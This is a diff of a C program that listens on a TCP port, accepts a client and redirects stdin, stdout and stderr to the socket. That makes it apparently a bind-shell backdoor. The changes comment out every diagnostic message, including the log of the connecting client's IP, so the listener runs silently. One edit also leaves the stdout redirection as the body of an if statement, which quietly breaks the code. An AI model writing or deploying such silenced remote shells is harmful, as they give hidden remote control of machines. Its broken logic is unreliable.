@@ -20,7 +20,7 @@ static int listen_sock;
 
 void sig_handler(int signo)
 {
-    printf("Received signal %d", signo);
+    //~ printf("Received signal %d", signo);
     if(signo == SIGKILL)
     {
         kill(child, SIGKILL);
@@ -31,7 +31,9 @@ void sig_handler(int signo)
 int main(int argc, char *argv[]) {
 
     if(signal(SIGINT, sig_handler) == SIG_ERR)
-        printf("\ncan't catch SIGINT\n");
+    {
+        //~ printf("\ncan't catch SIGINT\n");
+    }
 
     pid_t pid = getpid();
 
@@ -49,7 +51,7 @@ int main(int argc, char *argv[]) {
 
     // create a TCP socket, creation returns -1 on failure
     if ((listen_sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
-        printf("could not create listen socket\n");
+        //~ printf("could not create listen socket\n");
         return 1;
     }
 
@@ -57,7 +59,7 @@ int main(int argc, char *argv[]) {
     // address, will return -1 on error
     if ((bind(listen_sock, (struct sockaddr *)&server_address,
                 sizeof(server_address))) < 0) {
-        printf("could not bind socket\n");
+        //~ printf("could not bind socket\n");
         return 1;
     }
 
@@ -67,7 +69,7 @@ int main(int argc, char *argv[]) {
     int wait_size = 16;  // maximum number of waiting clients, after which
     // dropping begins
     if (listen(listen_sock, wait_size) < 0) {
-        printf("could not open socket for listening\n");
+        //~ printf("could not open socket for listening\n");
         return 1;
     }
 
@@ -87,18 +89,18 @@ int main(int argc, char *argv[]) {
         if ((sock =
                     accept(listen_sock, (struct sockaddr *)&client_address,
                         &client_address_len)) < 0) {
-            printf("could not open a socket to accept data\n");
+            //~ printf("could not open a socket to accept data\n");
             return 1;
         }
 
-        printf("client connected with ip address: %s\n",
-                inet_ntoa(client_address.sin_addr));
+        //~ printf("client connected with ip address: %s\n",
+                //~ inet_ntoa(client_address.sin_addr));
 
         //Everything has been redirected to the shell
         err = dup(fileno(stderr));
         in 	= dup2(sock, fileno(stdin));
         if(close(sock) != 0)
-            printf("Error while closing socket %d\n", sock);
+            //~ printf("Error while closing socket %d\n", sock);
 
         out = dup2(in, fileno(stdout));
         err = dup2(in, fileno(stderr));
